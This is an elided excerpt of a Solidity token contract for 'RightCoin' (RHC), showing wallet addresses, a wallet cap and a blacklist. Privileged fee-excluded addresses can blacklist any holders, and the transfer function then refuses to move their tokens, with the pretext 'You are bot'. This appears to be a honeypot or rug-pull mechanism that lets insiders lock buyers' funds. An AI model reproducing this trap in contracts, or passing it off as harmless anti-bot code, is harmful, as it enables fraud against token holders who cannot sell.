...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "RightCoin";
    string private _symbol = "RHC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3DA4853c22d19f6Ce43cf339E27Ba5192bd32A3b);
    address payable public buyBackWalletAddress = payable(0x3DA4853c22d19f6Ce43cf339E27Ba5192bd32A3b);
    ...
    uint256 public _walletMax = _totalSupply / 10;
    ...
    function addToBlackList(address[] calldata accounts) public {
        require(isExcludedFromFee[msg.sender]);
        for(uint i=0; i < accounts.length; i++) {
            isBlackList[accounts[i]] = true;
        }  
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isBlackList[sender], "You are bot");
